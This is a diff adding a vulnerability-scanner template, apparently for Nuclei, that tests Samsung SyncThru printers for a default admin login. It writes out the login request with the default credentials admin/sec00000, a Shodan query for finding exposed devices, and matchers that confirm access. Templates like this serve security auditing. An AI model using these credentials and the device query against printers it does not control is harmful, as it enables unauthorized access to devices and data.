@@ -1,0 +1,56 @@
+id: samsung-printer-default-login
+
+info:
+  name: Samsung Printer - Default Login
+  author: gy741
+  severity: high
+  description: |
+    Samsung printers contain a default admin login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+  reference:
+    - https://support.hp.com/gb-en/document/c05591673
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+    cpe: cpe:2.3:h:samsung:scx-6555n:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"SyncThru Web Service"
+    product: scx-6555n
+    vendor: samsung
+  tags: default-login,iot,samsung,printer
+
+http:
+  - raw:
+      - |
+        POST /sws/app/gnb/login/login.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+        Authentication=Basic {{base64(username + ':' + password)}}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - sec00000
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "success: true"
+          - "passwordExpiration"
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
+      - type: status
+        status:
+          - 200
+# digest: 490a0046304402205f0599dfde5063ffd32c81c664099e160c7b2e0393139000c342a0a76234ae4d022018a4c5aa48759d11cc7a943de219684c46314572afd7c360586c1c00b3b9bf12:922c64590222798bb761d5b6d8e72950
